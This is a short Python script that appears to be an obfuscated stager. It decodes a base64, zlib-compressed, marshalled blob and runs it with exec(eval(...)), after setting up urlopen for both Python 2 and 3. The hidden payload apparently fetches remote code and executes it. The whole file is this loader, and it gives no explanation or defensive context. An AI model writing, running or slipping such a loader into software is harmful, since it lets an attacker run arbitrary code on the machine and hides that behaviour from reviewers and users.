import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWJgYCgtyskvSM3TUM8oKSmw0tc3NtezNNczNtUzNDG0MjQ2ttDXLy5JTE8tKtYvy/DSK6hU19QrSk1M0dAEADGQEfc=')))))